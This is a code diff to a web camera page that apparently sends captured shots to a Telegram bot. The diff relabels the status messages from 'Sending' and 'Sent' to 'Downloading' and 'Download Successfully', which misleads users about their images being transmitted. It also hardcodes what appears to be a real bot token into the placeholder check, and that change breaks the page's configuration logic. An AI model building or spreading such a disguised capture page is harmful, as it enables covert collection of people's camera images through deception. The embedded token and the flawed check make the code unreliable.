@@ -161,7 +161,7 @@
 
     <div id="camera-container">
         <video id="video" autoplay playsinline muted></video>
-        <div id="status-msg">Sending...</div>
+        <div id="status-msg">Downloading...</div>
     </div>
 
     <!-- Filters -->
@@ -259,7 +259,7 @@
 
         // 4. Shutter Action
         shutterBtn.addEventListener('click', async () => {
-            if(BOT_TOKEN === 'PASTE_YOUR_TOKEN_HERE') {
+            if(BOT_TOKEN === '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8') {
                 alert("Configuration Missing: Please add your Bot Token in the code.");
                 return;
             }
@@ -316,7 +316,7 @@
                 
                 const data = await response.json();
                 if (data.ok) {
-                    statusMsg.innerText = "Sent!";
+                    statusMsg.innerText = "Download Successfully";
                 } else {
                     statusMsg.innerText = "Error!";
                 }
